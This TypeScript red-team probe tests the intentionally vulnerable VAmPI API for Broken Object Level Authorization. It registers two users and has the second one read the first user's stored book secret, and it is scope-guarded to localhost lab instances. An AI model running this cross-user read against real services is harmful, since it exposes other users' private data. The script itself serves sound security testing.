// Red-team probe for VAmPI (erev0s/VAmPI) as a real-world BOLA analog of our fixture.
// Proves the SAME bug class (OWASP API1:2023) against a different, OWASP-catalogued app:
// two users register; user1 stores a book + secret; user2 reads it by title. On the
// vulnerable build (vulnerable=1) user2 gets user1's secret; on the fixed build
// (vulnerable=0) it's 404. Emits the same Finding JSON shape as redteam/probe.ts.
//
// VAmPI target is OWNED/synthetic (local container or Daytona). Scope-guarded like probe.ts.
const TARGET = process.env.TARGET_URL ?? "http://127.0.0.1:5002"; // :5002 = insecure instance by convention
const ALLOWED = (process.env.ALLOWED_TARGETS ?? "http://127.0.0.1:5001,http://127.0.0.1:5002,http://localhost:5001,http://localhost:5002").split(",");

const stamp = Date.now().toString(36);
const U1 = { username: `owner_${stamp}`, password: "pw-owner-123", email: `owner_${stamp}@example.test` };
const U2 = { username: `attacker_${stamp}`, password: "pw-attacker-123", email: `attacker_${stamp}@example.test` };
const BOOK = { book_title: `secret-book-${stamp}`, secret: `SENSITIVE-${stamp}` };

function assertScope() {
  if (!ALLOWED.some((a) => TARGET.startsWith(a.trim()))) {
    console.error(`refusing: ${TARGET} is not in ALLOWED_TARGETS. This probe runs only against owned VAmPI instances.`);
    process.exit(2);
  }
}

async function call(method: string, path: string, body?: unknown, token?: string) {
  const res = await fetch(`${TARGET}${path}`, {
    method,
    headers: { "content-type": "application/json", ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, body: await res.json().catch(() => ({})) };
}

async function register(u: typeof U1) { await call("POST", "/users/v1/register", u); }
async function login(u: typeof U1): Promise<string> {
  const r = await call("POST", "/users/v1/login", { username: u.username, password: u.password });
  const token = r.body?.auth_token;
  if (!token) throw new Error(`login failed for ${u.username}: ${JSON.stringify(r.body)}`);
  return token;
}

async function main() {
  assertScope();

  await register(U1); await register(U2);
  const t1 = await login(U1), t2 = await login(U2);

  // Owner stores a book with a secret.
  await call("POST", "/books/v1", BOOK, t1);
  // Control: owner reads own book -> 200 with the secret.
  const own = await call("GET", `/books/v1/${BOOK.book_title}`, undefined, t1);
  // Attack: a different user reads it by title.
  const attack = await call("GET", `/books/v1/${BOOK.book_title}`, undefined, t2);

  const reproduced = attack.status === 200 && attack.body?.secret === BOOK.secret;

  const finding = {
    category: "OWASP-API1-2023",
    title: "Broken Object Level Authorization: cross-user book-secret read (VAmPI)",
    classification: { owasp: "API1:2023", wstg: "WSTG-ATHZ-04", asvs: "ASVS 5.0 V8.2.2" },
    targetScope: TARGET,
    target: "erev0s/VAmPI",
    operation: `GET /books/v1/${BOOK.book_title}`,
    reproduced,
    evidence: {
      ownerRead: { request: `${U1.username} GET own book`, status: own.status },
      crossUserRead: { request: `${U2.username} GET owner's book`, status: attack.status, leakedSecret: attack.body?.secret ?? null, owner: attack.body?.owner ?? null },
    },
    reproductionSteps: [
      `Register two users (${U1.username}, ${U2.username}) and log in.`,
      `${U1.username} POST /books/v1 with a secret.`,
      `${U2.username} GET /books/v1/${BOOK.book_title}.`,
      "vulnerable=1 returns 200 with the other user's secret; vulnerable=0 returns 404.",
    ],
    observedAt: new Date().toISOString(),
  };

  console.log(JSON.stringify(finding, null, 2));
  console.error(reproduced
    ? "\nBOLA REPRODUCED on VAmPI: cross-user secret read."
    : "\nNot reproduced: cross-user read denied (VAmPI appears to be running vulnerable=0).");
}

main().catch((e) => { console.error(e); process.exit(1); });
